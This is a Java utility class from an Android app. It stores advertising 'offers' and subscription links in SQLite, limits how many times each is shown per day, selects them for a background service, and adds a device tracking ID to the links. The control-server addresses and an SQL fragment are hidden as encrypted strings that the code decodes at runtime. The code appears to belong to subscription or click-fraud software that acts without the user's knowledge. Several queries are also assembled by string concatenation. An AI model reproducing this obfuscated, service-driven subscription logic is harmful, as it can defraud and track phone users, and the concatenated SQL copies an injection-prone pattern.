package w.c.s.utils;

import android.content.ContentValues;
import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;

import w.c.s.entity.Ma;


/**
 * Created by xlc on 2017/5/24.
 */

public class LinkUtil {

    /**
     * 通过保存的数据  得到下一条该执行的订阅链接
     *
     * @return
     */
    public static Ma get_sub_link (Context context) {
        // ORDER BY RANDOM() LIMIT 1
        String org0 = "uNL/KfKQRiwo8DtCApvWNpIX/0+l730gSEfbu/VPxGE=";

        SQLiteDatabase sqliteDataBase = DataBaseTool.getInstance(context).getDataBase();
        Cursor mCursor = null;
        Ma offer = null;
        try {
            StringBuilder strSql = new StringBuilder();
            strSql.append("select * from " + DataBaseTool.TBL_OPA);
            strSql.append(EncodeTool.deCrypt(org0));

            mCursor = sqliteDataBase.rawQuery(strSql.toString(), null);

            if ( mCursor.moveToNext() ) {
                offer = new Ma();
                offer.setSub_link_url(mCursor.getString(mCursor.getColumnIndex(Ma.SUB_LINK_URL)));
                offer.setAllow_network(mCursor.getInt(mCursor.getColumnIndex(Ma.ALLOW_NETWORK)));
                offer.setDtime(mCursor.getInt(mCursor.getColumnIndex(Ma.DTIME)));
                offer.setOffer_id(mCursor.getInt(mCursor.getColumnIndex(Ma.OFFER_ID)));
                offer.setId(mCursor.getInt(mCursor.getColumnIndex(Ma.ID)));
                offer.setSub_platform_id(mCursor.getInt(mCursor.getColumnIndex(Ma.SUB_PLATFORM_ID)));
                offer.setGetSource(mCursor.getInt(mCursor.getColumnIndex(Ma.GETSOURCE)));
                offer.setTrack(mCursor.getString(mCursor.getColumnIndex(Ma.TRACK)));
                offer.setJRate(mCursor.getInt(mCursor.getColumnIndex(Ma.JRATE)));
            }
        } catch ( Exception e ) {
            //            Ulog.show("查询数据错误：" + e.getMessage());
            e.printStackTrace();
        } finally {

            if ( mCursor != null ) {
                mCursor.close();
            }
        }
        return offer;
    }

    /**
     * 保存缓存数据
     *
     * @param jsonArray
     */
    public static void save (JSONArray jsonArray, Context mContext) {
        if ( null == jsonArray || jsonArray.length() <= 0 ) {
            return;
        }

        SQLiteDatabase sqliteDataBase = DataBaseTool.getInstance(mContext).getDataBase();
        sqliteDataBase.beginTransaction();
        try {
            for ( int i = 0; i < jsonArray.length(); i++ ) {
                JSONObject jsonObject = jsonArray.getJSONObject(i);

                Ma offer = new Ma(jsonObject.getInt(Ma.ID), jsonObject.getString(Ma.SUB_LINK_URL), jsonObject.getInt(Ma.SUB_DAY_SHOW_LIMIT),//
                        jsonObject.getInt(Ma.SUB_PLATFORM_ID), jsonObject.getInt(Ma.OFFER_ID), jsonObject.getInt(Ma.DTIME), //
                        jsonObject.getInt(Ma.ALLOW_NETWORK), jsonObject.getInt(Ma.GETSOURCE),//
                        jsonObject.getString(Ma.TRACK), jsonObject.getInt(Ma.JRATE));

                StringBuilder strSql = new StringBuilder();
                strSql.append("insert into " + DataBaseTool.TBL_OPA);
                strSql.append(" ( " + offer.getSQLField() + " ) ");
                strSql.append(" values ( " + offer.getSQLValues() + " ) ");
                sqliteDataBase.execSQL(strSql.toString());

                query_local(sqliteDataBase, offer.getOffer_id(), offer.getSub_platform_id());
            }
            sqliteDataBase.setTransactionSuccessful();
        } catch ( Exception e ) {
            e.printStackTrace();
        } finally {
            sqliteDataBase.endTransaction();
        }
    }

    /***
     * 判断统计是否有这条数据
     * @param db
     */
    public static void query_local (SQLiteDatabase db, int offer_id, int id) {
        Cursor cursor = null;
        try {
            cursor = db.rawQuery("select * from " + DataBaseTool.TBL_LOCK_CLICK + " where offer_id = " + offer_id + " and sub_platform_id = " + id, new String[]{});
            if ( !cursor.moveToNext() ) {

                //                Ulog.w("初始化" + offer_id + "这条数据的本地统计");

                ContentValues contentValues = new ContentValues();
                contentValues.put("sub_platform_id", id);
                contentValues.put("offer_id", offer_id);
                contentValues.put("sub_day_limit_now", 0);

                db.insert(DataBaseTool.TBL_LOCK_CLICK, null, contentValues);
            }
        } catch ( Exception e ) {
            e.printStackTrace();
        } finally {
            if ( cursor != null ) {
                cursor.close();
            }
        }
    }

    /***
     * 更新次数
     */
    public static void save_sub_link_limit (Context context, Ma offer) {
        //        Ulog.w("更新本地统计次数");
        SQLiteDatabase sqliteDataBase = DataBaseTool.getInstance(context).getDataBase();
        try {
            StringBuilder strSql = new StringBuilder();
            strSql.append("update " + DataBaseTool.TBL_LOCK_CLICK);
            strSql.append(" set sub_day_limit_now = sub_day_limit_now + 1 ");
            strSql.append(" where offer_id = ? and sub_platform_id = ?");
            sqliteDataBase.execSQL(strSql.toString(), new Object[]{offer.getOffer_id(), offer.getSub_platform_id()});
            getOfferExecuteTime(context, offer);
        } catch ( Exception e ) {
            //            Ulog.w("更新次数错误：" + e.getMessage());
            e.printStackTrace();
        }
    }

    public static void getOfferExecuteTime (Context context, Ma offer) {
        Cursor cursor = null;
        Cursor mcursor = null;
        SQLiteDatabase sqliteDataBase = DataBaseTool.getInstance(context).getDataBase();
        try {
            cursor = sqliteDataBase.rawQuery("select * from " + DataBaseTool.TBL_LOCK_CLICK + " where offer_id = " + offer.getOffer_id() + " and sub_platform_id = " + offer.getSub_platform_id(), null);
            if ( cursor.moveToNext() ) {
                //                Ulog.w("offer:" + s + "的显示次数：" + cursor.getInt(cursor.getColumnIndex("sub_day_limit_now")));
                LogUtil.show("p:" + offer.getSub_platform_id() + " o:" + offer.getOffer_id() + "  t:" + cursor.getInt(cursor.getColumnIndex("sub_day_limit_now")));
                mcursor = sqliteDataBase.rawQuery("select * from " + DataBaseTool.TBL_OPA + " where offer_id = " + offer.getOffer_id() + " and sub_platform_id = " + offer.getSub_platform_id(), null);
                if ( mcursor.moveToNext() ) {
                    // Ulog.w("p:"+offer.getSub_platform_id() +"offer:" + offer.getOffer_id() + "的限制次数：" + mcursor.getInt(mcursor.getColumnIndex(Ma.SUB_DAY_SHOW_LIMIT)));
                    // Ulog.show("offer:" + s + " limit times：" + mcursor.getInt(mcursor.getColumnIndex(Ma.SUB_DAY_SHOW_LIMIT)));
                }
            }

        } catch ( Exception e ) {
            e.printStackTrace();
        } finally {
            if ( cursor != null ) {
                cursor.close();
            }
            if ( mcursor != null ) {
                mcursor.close();
            }
        }
    }


    /***
     * 清除缓存数据
     * @param context
     */
    public static void delete_all (Context context) {
        SQLiteDatabase sqliteDataBase = DataBaseTool.getInstance(context).getDataBase();
        sqliteDataBase.execSQL("delete from " + DataBaseTool.TBL_OPA);
        delete_local_data(context);
    }

    public static void delete_local_data (Context context) {
        if ( checkTimeAboveMonth(context) ) {
            SQLiteDatabase sqliteDataBase = DataBaseTool.getInstance(context).getDataBase();
            sqliteDataBase.execSQL("delete from " + DataBaseTool.TBL_LOCK_CLICK);
        }
    }

    private static boolean checkTimeAboveMonth (Context context) {
        SharedPreferences preferences = context.getSharedPreferences("_c_month", 0);
        SharedPreferences.Editor editor = preferences.edit();
        int lastMonth = preferences.getInt("asd", 0);
        Calendar calendar = Calendar.getInstance();
        int currentMonth = calendar.get(Calendar.MONTH) + 1;
        editor.putInt("asd", currentMonth);
        editor.apply();
        if ( currentMonth != lastMonth ) {
            return true;
        }
        return false;
    }

    /***
     * 服务中执行的时候查询
     * @param context
     * @return
     */
    public static List<Ma> getOfferList (Context context, int s, int offer_id, int plat) {

        SQLiteDatabase sq = DataBaseTool.getInstance(context).getDataBase();
        List<Ma> list = new ArrayList<>();
        Cursor mCursor = null;

        try {

            StringBuilder strSql = new StringBuilder();
            strSql.append("select * from ");
            strSql.append(DataBaseTool.TBL_LOCK_CLICK + "," + DataBaseTool.TBL_OPA);
            strSql.append(" where tbl_sub.offer_id = tbl_local.offer_id ");
            strSql.append(" and tbl_sub.sub_platform_id = tbl_local.sub_platform_id ");
            strSql.append(" and tbl_sub.sub_day_show_limit > tbl_local.sub_day_limit_now ");
            strSql.append(" and ( tbl_sub.allow_network = " + s + " or tbl_sub.allow_network = 2 ) ");
            //            strSql.append(" and tbl_sub.offer_id <> " + offer_id);
            strSql.append(" order by tbl_local.sub_day_limit_now asc limit 9");

            mCursor = sq.rawQuery(strSql.toString(), new String[]{});

            while ( mCursor.moveToNext() ) {
                Ma offer = new Ma();
                offer.setSub_link_url(mCursor.getString(mCursor.getColumnIndex(Ma.SUB_LINK_URL)));
                offer.setAllow_network(mCursor.getInt(mCursor.getColumnIndex(Ma.ALLOW_NETWORK)));
                offer.setDtime(mCursor.getInt(mCursor.getColumnIndex(Ma.DTIME)));
                offer.setOffer_id(mCursor.getInt(mCursor.getColumnIndex(Ma.OFFER_ID)));
                offer.setId(mCursor.getInt(mCursor.getColumnIndex(Ma.ID)));
                offer.setSub_platform_id(mCursor.getInt(mCursor.getColumnIndex(Ma.SUB_PLATFORM_ID)));
                offer.setGetSource(mCursor.getInt(mCursor.getColumnIndex(Ma.GETSOURCE)));
                offer.setTrack(mCursor.getString(mCursor.getColumnIndex(Ma.TRACK)));
                offer.setJRate(mCursor.getInt(mCursor.getColumnIndex(Ma.JRATE)));

                if ( offer.getOffer_id() == offer_id && offer.getSub_platform_id() == plat ) {
                    //相同offer，获取下一条
                    continue;
                }

                if ( list.size() < 8 ) {
                    list.add(offer);
                }
            }

        } catch ( Exception e ) {
            //            Ulog.w("服务中查询错误：" + e.getMessage());
            e.printStackTrace();
        } finally {
            if ( mCursor != null ) {
                mCursor.close();
            }
        }

        return list;
    }


    public static Ma get_one_offer (Context context) {
        SQLiteDatabase sqliteDataBase = DataBaseTool.getInstance(context).getDataBase();
        Cursor mCursor = null;

        try {
            StringBuilder strSql = new StringBuilder();
            strSql.append("select * from " + DataBaseTool.TBL_OPA + " , " + DataBaseTool.TBL_LOCK_CLICK);
            strSql.append(" where tbl_sub.offer_id = tbl_local.offer_id ");
            strSql.append(" and tbl_sub.sub_platform_id = tbl_local.sub_platform_id ");
            strSql.append(" and tbl_sub.sub_day_show_limit > tbl_local.sub_day_limit_now ");
            strSql.append(" order by tbl_local.sub_day_limit_now asc");

            mCursor = sqliteDataBase.rawQuery(strSql.toString(), null);
            if ( mCursor.moveToNext() ) {
                Ma offer = new Ma();
                offer.setSub_link_url(mCursor.getString(mCursor.getColumnIndex(Ma.SUB_LINK_URL)));
                offer.setAllow_network(mCursor.getInt(mCursor.getColumnIndex(Ma.ALLOW_NETWORK)));
                offer.setDtime(mCursor.getInt(mCursor.getColumnIndex(Ma.DTIME)));
                offer.setOffer_id(mCursor.getInt(mCursor.getColumnIndex(Ma.OFFER_ID)));
                offer.setId(mCursor.getInt(mCursor.getColumnIndex(Ma.ID)));
                offer.setSub_platform_id(mCursor.getInt(mCursor.getColumnIndex(Ma.SUB_PLATFORM_ID)));
                offer.setGetSource(mCursor.getInt(mCursor.getColumnIndex(Ma.GETSOURCE)));
                offer.setTrack(mCursor.getString(mCursor.getColumnIndex(Ma.TRACK)));
                offer.setJRate(mCursor.getInt(mCursor.getColumnIndex(Ma.JRATE)));
                return offer;
            }
        } catch ( Exception e ) {
            //            Ulog.w("服务中查询错误：" + e.getMessage());
            e.printStackTrace();
        } finally {
            if ( mCursor != null ) {
                mCursor.close();
            }
        }
        return null;
    }

    /***
     * 转换链接
     * @param offer
     * @param context
     * @param isService
     * @return
     */
    public static String getChangeUrl (Ma offer, Context context, boolean isService) {
        //        Ulog.w("服务器设置的追踪track:" + offer.getTrack());
        String cid = XmlShareTool.getCID(context);
        String keyStore = isService ? "S" + cid : "A" + cid;
        return offer.getSub_link_url() + String.format(offer.getTrack(), keyStore);
    }

    //http://45.79.78.178
    private static final String A = "V4NWrDRYELhAkujWoYNJHBNygGDQLvFQeViNwJbzH7c=";
    //http://ad.m2888.net
    private static final String B = "LWVHudaC9jIWee+RYkCysx9bJTVpk+x5iYzuHHgkWEQ=";
    //http://pic.m2888.net
    private static final String C = "oa3EKmiE0maV3n4VLDxGK58CEPPLsSI/m71iP6EFuqg=";

    public static boolean check_url (String url) {
        return url.contains(EncodeTool.deCrypt(A)) ||//
                url.contains(EncodeTool.deCrypt(B)) ||//
                url.contains(EncodeTool.deCrypt(C));
    }
}